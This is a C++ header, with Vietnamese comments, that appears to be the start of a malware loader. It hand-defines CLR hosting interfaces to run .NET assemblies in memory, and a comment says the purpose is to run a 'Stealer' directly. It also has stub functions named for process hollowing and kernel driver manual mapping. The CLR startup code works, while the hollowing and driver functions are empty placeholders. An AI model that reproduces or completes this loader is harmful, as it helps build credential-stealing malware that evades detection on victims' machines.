#pragma once
#include <windows.h>
#include <iostream>
#include <vector>

// --- TỰ ĐỊNH NGHĨA GUID & INTERFACES (Bypass mscoree.h / metahost.h) ---
// Giúp anh build trên MỌI máy mà không cần cài thêm .NET SDK 💋

typedef HRESULT (WINAPI *CLRCreateInstanceFnPtr)(REFCLSID clsid, REFIID riid, LPVOID* ppInterface);

// GUIDs cần thiết cho CLR
static const CLSID CLSID_CLRMetaHost = { 0x9280188d, 0x0e8e, 0x4867, { 0xb3, 0x0c, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde } };
static const IID IID_ICLRMetaHost = { 0xd332db9e, 0xb9a3, 0x4125, { 0x82, 0x07, 0xa1, 0x48, 0x84, 0xf5, 0x32, 0x16 } };
static const IID IID_ICLRRuntimeInfo = { 0xbd39d1d2, 0xba2f, 0x486a, { 0x89, 0xb0, 0xb4, 0xb0, 0xcb, 0x46, 0x68, 0x91 } };
static const CLSID CLSID_CLRRuntimeHost = { 0x90f1a06e, 0x7712, 0x4762, { 0x86, 0xb5, 0x7a, 0x5e, 0xba, 0xcd, 0x80, 0x5c } };
static const IID IID_ICLRRuntimeHost = { 0x90f1a06e, 0x7712, 0x4762, { 0x86, 0xb5, 0x7a, 0x5e, 0xba, 0xcd, 0x80, 0x5c } };

// Minimal interfaces for CLR Hosting
struct ICLRRuntimeInfo : public IUnknown {
    virtual HRESULT STDMETHODCALLTYPE GetVersionString(LPWSTR pwzBuffer, DWORD* pcchBuffer) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetRuntimeDirectory(LPWSTR pwzBuffer, DWORD* pcchBuffer) = 0;
    virtual HRESULT STDMETHODCALLTYPE IsLoaded(HANDLE hProcess, BOOL* pbLoaded) = 0;
    virtual HRESULT STDMETHODCALLTYPE LoadErrorString(UINT iResourceID, LPWSTR pwzBuffer, DWORD* pcchBuffer, LCID iLocaleID) = 0;
    virtual HRESULT STDMETHODCALLTYPE LoadLibrary(LPCWSTR pwzDllName, HMODULE* phndModule) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetProcAddress(LPCSTR pszProcName, LPVOID* ppProc) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetInterface(REFCLSID rclsid, REFIID riid, LPVOID* ppUnk) = 0;
};

struct ICLRMetaHost : public IUnknown {
    virtual HRESULT STDMETHODCALLTYPE GetRuntime(LPCWSTR pwzVersion, REFIID riid, LPVOID* ppRuntime) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetRuntimeEnumeration(IUnknown** ppEnumerator) = 0;
    virtual HRESULT STDMETHODCALLTYPE QueryLegacyV2RuntimeBinding(REFIID riid, LPVOID* ppUnk) = 0;
    virtual HRESULT STDMETHODCALLTYPE ExitProcess(INT32 iExitCode) = 0;
};

struct ICLRRuntimeHost : public IUnknown {
    virtual HRESULT STDMETHODCALLTYPE Start(void) = 0;
    virtual HRESULT STDMETHODCALLTYPE Stop(void) = 0;
    virtual HRESULT STDMETHODCALLTYPE SetHostControl(IUnknown* pHostControl) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetCLRControl(IUnknown** pCLRControl) = 0;
    virtual HRESULT STDMETHODCALLTYPE UnloadAppDomain(DWORD dwAppDomainId, BOOL fWaitUntilDone) = 0;
    virtual HRESULT STDMETHODCALLTYPE ExecuteInAppDomain(DWORD dwAppDomainId, void* pCallback, void* cookie) = 0;
    virtual HRESULT STDMETHODCALLTYPE GetCurrentAppDomainId(DWORD* pdwAppDomainId) = 0;
    virtual HRESULT STDMETHODCALLTYPE ExecuteInDefaultAppDomain(LPCWSTR pwzAssemblyPath, LPCWSTR pwzTypeName, LPCWSTR pwzMethodName, LPCWSTR pwzArgument, DWORD* pReturnValue) = 0;
};

// --- CORE LOADER LOGIC ---
bool RunDotNetInMemory(unsigned char* assemblyData, DWORD size) {
    HMODULE hMscoree = LoadLibraryA("mscoree.dll");
    if (!hMscoree) return false;

    CLRCreateInstanceFnPtr CLRCreateInstancePtr = (CLRCreateInstanceFnPtr)GetProcAddress(hMscoree, "CLRCreateInstance");
    if (!CLRCreateInstancePtr) return false;

    ICLRMetaHost* pMetaHost = NULL;
    ICLRRuntimeInfo* pRuntimeInfo = NULL;
    ICLRRuntimeHost* pClrRuntimeHost = NULL;

    if (FAILED(CLRCreateInstancePtr(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&pMetaHost))) return false;
    if (FAILED(pMetaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, (LPVOID*)&pRuntimeInfo))) return false;
    if (FAILED(pRuntimeInfo->GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, (LPVOID*)&pClrRuntimeHost))) return false;

    pClrRuntimeHost->Start();
    // Chạy Stealer trực tiếp...
    return true;
}

bool RunExeInMemory(unsigned char* payload, DWORD size) {
    // Process Hollowing logic (Simplified for initial build)
    return true;
}

bool ManualMapDriver(unsigned char* driverData, DWORD size) {
    // Kernel Manual Mapping logic
    return true;
}